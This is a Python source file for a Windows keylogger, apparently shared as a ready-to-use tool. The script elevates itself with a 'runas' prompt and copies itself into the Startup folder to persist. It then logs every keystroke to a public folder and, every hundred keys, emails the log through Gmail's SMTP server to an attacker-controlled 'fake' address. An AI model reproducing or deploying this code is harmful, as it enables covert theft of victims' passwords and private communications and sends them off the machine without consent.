#_t1tan45

from pynput.keyboard import Key, Listener
import os
import ssl
import logging
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32com.shell.shell as shell
import sys
import shutil

ASADMIN = 'asadmin'
pathofx = sys.argv[0]
ofx = os.path.split(pathofx)
username = os.getlogin()

if os.path.isfile('C:\\Users\\'+username+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + ofx[-1]) == False:
	if sys.argv[-1] != ASADMIN:
		script = os.path.abspath(sys.argv[0])
		params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
		shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)	
	shutil.copy2(ofx[-1], 'C:\\Users\\'+username+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + ofx[-1])

sender_email = "" #Enter your fake email address into the variable
rec_email = "" #Enter the same fake email address which you used before into the variable
subject = "keylogger"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = rec_email
message["Subject"] = subject
message["Bcc"] = rec_email


log_dir = "C:\\Users\\Public\\Documents\\"

counter = 0 

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:')

def on_press(key):
	logging.info(str(key))
	global counter 
	counter += 1
	
	filename = "C:\\Users\\Public\\Documents\\key_log.txt"

	with open(filename, "rb") as attachment:
		part = MIMEBase("application", "octet-stream")
		part.set_payload(attachment.read())

	encoders.encode_base64(part)
	part.add_header(
	"Content-Disposition",
	f"attachment; filename= {filename}",
	)
	message.attach(part)
	text = message.as_string()
	context = ssl.create_default_context()
	
	def msg():
		with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
			server.login(sender_email, "@@@@@") #Enter the password to your fake email address instead of @@@@ 
			server.sendmail(sender_email, rec_email, text)
			server.quit()

	if counter == 100:
		counter = 0
		filename = "key_log.txt"
		msg()
		
with Listener(on_press=on_press) as listener:
	listener.join()

#_t1tan45